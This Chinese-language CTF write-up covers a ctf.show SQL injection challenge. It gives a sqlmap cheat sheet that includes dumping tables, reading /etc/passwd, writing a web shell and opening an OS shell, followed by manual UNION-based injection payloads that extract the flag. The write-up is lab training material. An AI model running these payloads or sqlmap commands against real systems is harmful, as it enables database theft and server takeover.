最简单的SQL注入


思路：
## 一、对其账号密码爆破
由于爆破一直无进展，且题目有提示【最简单的SQL注入】
于是放弃

## 二、sqlmap工具自动注入

sqlmap -u http://10.255.1.195/?id=123
sqlmap -u 'https://b53d0495-fd85-42d0-8e94-37ed3c6ea53f.challenge.ctf.show/?url=1'

### 步骤 1：基本检测和指纹识别
这是最基本的用法， sqlmap 会尝试检测目标 URL 是否存在 SQL 注入漏洞，并识别数据库类型。

思路 ：提供目标 URL，让 sqlmap 自动探测。

`sqlmap -u "http://example.com/vulnerable.php?id=1"`

### 步骤 2：枚举数据库
如果 sqlmap 确认存在注入点，下一步通常是枚举数据库。

思路 ：告诉 sqlmap 列出所有可用的数据库名称。

`sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs`

### 步骤 3：枚举表
选择一个数据库后，枚举该数据库中的所有表。

思路 ：指定数据库名称，让 sqlmap 列出其中的表。

`sqlmap -u "http://example.com/vulnerable.php?id=1" -D "database_name" --tables`

### 步骤 4：枚举列
选择一个表后，枚举该表中的所有列。

思路 ：指定数据库和表名称，让 sqlmap 列出其中的列。

`sqlmap -u "http://example.com/vulnerable.php?id=1" -D "database_name" -T "table_name" --columns`

### 步骤 5：转储数据
获取指定表或列中的数据。

思路 ：指定数据库、表和/或列名称，让 sqlmap 转储数据。

```bash
# 转储整个表的数据
sqlmap -u "http://example.com/vulnerable.php?id=1" -D "database_name" -T "table_name" --dump

# 转储特定列的数据
sqlmap -u "http://example.com/vulnerable.php?id=1" -D "database_name" -T "table_name" -C "column1,column2" --dump
```


### 步骤 6：其他常用选项
POST 请求注入：
Bash



运行
sqlmap -u "http://example.com/login.php" --data="username=test&password=test"
--data：指定 POST 请求的数据。


或者 sqlmap -r request.txt --tamper="space2plus.py" --dbs
（其中 request.txt 是包含 POST 请求内容的文本文件）
```http
POST /index.php? HTTP/1.1
Host: a2a1c4aa-ede8-4f4b-85e6-c582f2c62a4c.challenge.ctf.show
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Origin: http://a2a1c4aa-ede8-4f4b-85e6-c582f2c62a4c.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9
Referer: http://a2a1c4aa-ede8-4f4b-85e6-c582f2c62a4c.challenge.ctf.show/index.php?
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 33

username=amdin&password=admin
```


Cookie 注入：
Bash

sqlmap -u "http://a2a1c4aa-ede8-4f4b-85e6-c582f2c62a4c.challenge.ctf.show/index.php" --data="username=admin&password=admin"

运行
sqlmap -u "http://example.com/vulnerable.php" --cookie="PHPSESSID=abc; security=low"
--cookie：指定 HTTP Cookie。
指定数据库类型：
Bash



运行
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbms=mysql
--dbms：手动指定后端数据库类型，可以加快检测速度。
风险和级别：
Bash



运行
sqlmap -u "http://example.com/vulnerable.php?id=1" --risk=3 --level=5
--risk：风险等级（1-3，默认为 1），影响 Payload 的危险性。
--level：测试等级（1-5，默认为 1），影响测试的全面性，等级越高，测试的注入点和 Payload 越多。
当前用户和数据库：
Bash



运行
sqlmap -u "http://example.com/vulnerable.php?id=1" --current-user --current-db
--current-user：获取当前数据库用户。
--current-db：获取当前数据库名称。
文件系统访问 (如果数据库用户有权限)：
Bash



运行
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/etc/passwd"sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
--file-read：读取文件。
--file-write：写入文件。
--file-dest：写入文件的目标路径。
操作系统命令执行 (如果数据库用户有权限)：
Bash



运行
sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
--os-shell：获取一个操作系统的 shell。


## 三、手工注入

先对输入框进行注入，判断注入点


### 1.验证是否注入成功，注入点位置
`1' or 1=1#` 能看到直接回显提示已登陆，因页面展示不够明显，差点没发现成功

### 2.查字段数
1' or '1'='1' order by 1# 经查 字段数为3

### 3.联合查询，
1' or '1'='1' union select 1,2,3# 发现回显位2 

### 4.查询数据库名 
1' or '1'='1' union select 1,database(),3# 获得数据库名：web2 

### 5.查询表名
1' or '1'='1' union select 1,table_name,3 from information_schema.tables where table_schema='web2'# 获得表名：flag 

### 6.查询列名
1' or '1'='1' union select 1,column_name,3 from information_schema.column where table_name='flag'# 获得列名：flag 

### 7.获得flag的值
1' or '1'='1' union select 1,flag,3 from flag# 得出最终结果



首先判断中间有几列，因为使用 UNION 的时候两个表的列数量必须相同，因此测试直到填写admin ' or 1=1 union select 1,2,3;#判断处有三列，根据返回的信息“欢迎你，ctfshow欢迎你，2”判断前端显示的是第2列内容。

2.首先查询数据库名字 ，输入语句admin ' or 1=1 union select 1,database(),3;# 得到返回信息为“欢迎你，ctfshow欢迎你，web2，所以数据库名为web2。 

3.然后根据语句 admin ' or 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='web2'),3;#。group_concat 是为了将查询结果连接成一个字符串输出，结果为“欢迎你，ctfshow欢迎你，flag,user”，因此我们得知有两个表为flag和user。 

4.接下来就是获取flag表格的列名，输入语句 admin' or 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name= 'flag' and table_schema='web2' ),3 #。根据结果“欢迎你，ctfshow欢迎你，flag”得出列名为flag 

5.最后获取flag，输入语句admin' or 1=1 union select 1,(select flag from flag limit 0,1 ),3 # （limit目的为获取第一行的值）获得结果“欢迎你，ctfshow欢迎你，ctfshow{b2faa05a-c4cc-4a5f-a58f-9391ebb19afa}”